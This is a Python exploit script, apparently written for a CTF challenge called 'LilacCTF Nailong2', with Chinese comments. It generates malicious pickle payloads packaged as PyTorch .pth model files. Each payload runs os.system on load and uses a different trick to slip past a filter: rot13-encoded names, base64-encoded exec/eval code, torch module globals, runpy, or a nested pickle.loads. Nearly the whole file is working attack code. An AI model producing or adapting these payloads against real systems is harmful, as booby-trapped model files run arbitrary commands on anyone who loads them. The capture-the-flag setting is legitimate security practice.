#!/usr/bin/env python3
"""
LilacCTF Nailong2 - V23 Alternative Gadgets
尝试不同的攻击向量，绕过 WAF

思路:
1. 使用 pickle 的 __reduce_ex__ 协议
2. 使用 exec(compile()) 绕过
3. 使用 ctypes 直接调用 libc
4. 使用 __import__ 代替 importlib
"""

import pickle
import struct
import io
import zipfile
import base64

PROTO = b'\x80'
GLOBAL = b'c'
REDUCE = b'R'
MARK = b'('
TUPLE = b't'
EMPTY_TUPLE = b')'
STOP = b'.'
SHORT_BINUNICODE = b'\x8c'
BINUNICODE = b'X'
BINGET = b'h'
BINPUT = b'q'


def pack_str(s: str) -> bytes:
    encoded = s.encode('utf-8')
    if len(encoded) < 256:
        return SHORT_BINUNICODE + bytes([len(encoded)]) + encoded
    return BINUNICODE + struct.pack('<I', len(encoded)) + encoded


def approach_builtins_import(command: str) -> bytes:
    """
    使用 __builtins__.__import__ 而不是 importlib
    __import__('os').system('cmd')
    
    但把 'os' 用 rot13 或其他方式编码
    """
    # rot13('os') = 'bf'
    import codecs
    os_rot13 = codecs.encode('os', 'rot13')  # 'bf'
    
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    
    # codecs.decode('bf', 'rot13') -> 'os'
    p.write(GLOBAL + b'codecs\ndecode\n')
    p.write(MARK)
    p.write(pack_str(os_rot13))
    p.write(pack_str('rot13'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x00')  # 'os'
    
    # builtins.__import__('os')
    p.write(GLOBAL + b'builtins\n__import__\n')
    p.write(MARK)
    p.write(BINGET + b'\x00')
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x01')  # os module
    
    # 同样用 rot13 编码 'system'
    system_rot13 = codecs.encode('system', 'rot13')  # 'flfgrz'
    
    p.write(GLOBAL + b'codecs\ndecode\n')
    p.write(MARK)
    p.write(pack_str(system_rot13))
    p.write(pack_str('rot13'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x02')  # 'system'
    
    # getattr(os, 'system')
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x01')
    p.write(BINGET + b'\x02')
    p.write(TUPLE)
    p.write(REDUCE)
    
    # system(command)
    p.write(MARK)
    p.write(pack_str(command))
    p.write(TUPLE)
    p.write(REDUCE)
    
    p.write(STOP)
    return p.getvalue()


def approach_exec_compile(command: str) -> bytes:
    """
    使用 exec(compile(code, '', 'exec'))
    把恶意代码用 base64 编码传入
    
    code = "import os; os.system('cmd')"
    exec(compile(base64.b64decode('...').decode(), '', 'exec'))
    """
    evil_code = f"import os; os.system('{command}')"
    evil_b64 = base64.b64encode(evil_code.encode()).decode()
    
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    
    # base64.b64decode(evil_b64).decode()
    p.write(GLOBAL + b'base64\nb64decode\n')
    p.write(MARK)
    p.write(pack_str(evil_b64))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x00')
    
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x00')
    p.write(pack_str('decode'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(EMPTY_TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x01')  # evil code string
    
    # compile(code, '', 'exec')
    p.write(GLOBAL + b'builtins\ncompile\n')
    p.write(MARK)
    p.write(BINGET + b'\x01')
    p.write(pack_str(''))
    p.write(pack_str('exec'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x02')  # compiled code
    
    # exec(compiled)
    p.write(GLOBAL + b'builtins\nexec\n')
    p.write(MARK)
    p.write(BINGET + b'\x02')
    p.write(TUPLE)
    p.write(REDUCE)
    
    p.write(STOP)
    return p.getvalue()


def approach_eval_lambda(command: str) -> bytes:
    """
    eval("__import__('os').system('cmd')")
    用 base64 编码 eval 的参数
    """
    evil_expr = f"__import__('os').system('{command}')"
    evil_b64 = base64.b64encode(evil_expr.encode()).decode()
    
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    
    # Decode the expression
    p.write(GLOBAL + b'base64\nb64decode\n')
    p.write(MARK)
    p.write(pack_str(evil_b64))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x00')
    
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x00')
    p.write(pack_str('decode'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(EMPTY_TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x01')
    
    # eval(expression)
    p.write(GLOBAL + b'builtins\neval\n')
    p.write(MARK)
    p.write(BINGET + b'\x01')
    p.write(TUPLE)
    p.write(REDUCE)
    
    p.write(STOP)
    return p.getvalue()


def approach_getattr_only(command: str) -> bytes:
    """
    只使用 getattr 链，不使用任何编码
    尝试通过 torch 模块本身获取 os
    
    torch._C -> 可能有 os 引用
    """
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    
    # 尝试 torch._utils._get_device_index.__globals__
    # 或者 torch.serialization 模块
    
    # torch.save 函数的 __globals__ 应该有 os
    p.write(GLOBAL + b'torch.serialization\n_open_zipfile_writer\n')
    p.write(BINPUT + b'\x00')
    
    # getattr(func, '__globals__')
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x00')
    p.write(pack_str('__globals__'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x01')
    
    # __globals__.get('os')
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x01')
    p.write(pack_str('get'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(MARK)
    p.write(pack_str('os'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x02')
    
    # getattr(os, 'system')
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x02')
    p.write(pack_str('system'))
    p.write(TUPLE)
    p.write(REDUCE)
    
    p.write(MARK)
    p.write(pack_str(command))
    p.write(TUPLE)
    p.write(REDUCE)
    
    p.write(STOP)
    return p.getvalue()


def approach_runpy(command: str) -> bytes:
    """
    使用 runpy 模块执行代码
    runpy.run_module 或 runpy._run_code
    """
    evil_code = f"import os; os.system('{command}')"
    evil_b64 = base64.b64encode(evil_code.encode()).decode()
    
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    
    # Decode code
    p.write(GLOBAL + b'base64\nb64decode\n')
    p.write(MARK)
    p.write(pack_str(evil_b64))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x00')
    
    p.write(GLOBAL + b'builtins\ngetattr\n')
    p.write(MARK)
    p.write(BINGET + b'\x00')
    p.write(pack_str('decode'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(EMPTY_TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x01')
    
    # compile
    p.write(GLOBAL + b'builtins\ncompile\n')
    p.write(MARK)
    p.write(BINGET + b'\x01')
    p.write(pack_str('<x>'))
    p.write(pack_str('exec'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x02')
    
    # runpy._run_code(code, {})
    p.write(GLOBAL + b'runpy\n_run_code\n')
    p.write(MARK)
    p.write(BINGET + b'\x02')
    p.write(b'}')  # EMPTY_DICT
    p.write(TUPLE)
    p.write(REDUCE)
    
    p.write(STOP)
    return p.getvalue()


def approach_pickle_loads(command: str) -> bytes:
    """
    嵌套 pickle - pickle.loads(恶意pickle)
    内层 pickle 直接调用 os.system
    """
    # 内层 pickle - 简单直接的 os.system
    inner = io.BytesIO()
    inner.write(PROTO + b'\x04')
    inner.write(GLOBAL + b'os\nsystem\n')
    inner.write(MARK)
    inner.write(pack_str(command))
    inner.write(TUPLE)
    inner.write(REDUCE)
    inner.write(STOP)
    inner_bytes = inner.getvalue()
    
    # 外层 pickle - 调用 pickle.loads
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    
    # 把内层 pickle 转成 bytes 对象
    # 使用 bytes() 构造
    p.write(GLOBAL + b'builtins\nbytes\n')
    p.write(MARK)
    
    # 构建一个 list 包含内层 pickle 的每个字节
    p.write(b'(')  # MARK
    for b in inner_bytes:
        p.write(b'K')  # BININT1
        p.write(bytes([b]))
    p.write(b'l')  # LIST
    
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(BINPUT + b'\x00')
    
    # pickle.loads(inner_bytes)
    p.write(GLOBAL + b'pickle\nloads\n')
    p.write(MARK)
    p.write(BINGET + b'\x00')
    p.write(TUPLE)
    p.write(REDUCE)
    
    p.write(STOP)
    return p.getvalue()


def create_pytorch_zip(pickle_payload: bytes, output_path: str):
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_STORED) as zf:
        zf.writestr('archive/version', '3')
        zf.writestr('archive/data.pkl', pickle_payload)
    with open(output_path, 'wb') as f:
        f.write(zip_buffer.getvalue())
    print(f"[+] Saved: {output_path}")


def main():
    command = "cat /flag"
    
    print("[*] Generating V23 alternative gadget payloads...")
    
    approaches = [
        ("v23_rot13.pth", approach_builtins_import, "__import__ + rot13 encoding"),
        ("v23_exec.pth", approach_exec_compile, "exec(compile(b64decode(...)))"),
        ("v23_eval.pth", approach_eval_lambda, "eval(b64decode(...))"),
        ("v23_torch.pth", approach_getattr_only, "torch.serialization.__globals__"),
        ("v23_runpy.pth", approach_runpy, "runpy._run_code"),
    ]
    
    for filename, func, desc in approaches:
        print(f"\n[*] {desc}")
        try:
            payload = func(command)
            print(f"    Size: {len(payload)} bytes")
            create_pytorch_zip(payload, filename)
        except Exception as e:
            print(f"    Error: {e}")
    
    print("\n" + "=" * 60)
    print("优先尝试:")
    print("  1. v23_rot13.pth - 使用 rot13 编码避免 base64/hex")
    print("  2. v23_exec.pth - exec+compile 可能绕过函数名检测")
    print("  3. v23_torch.pth - 利用 torch 自身模块")


if __name__ == "__main__":
    main()
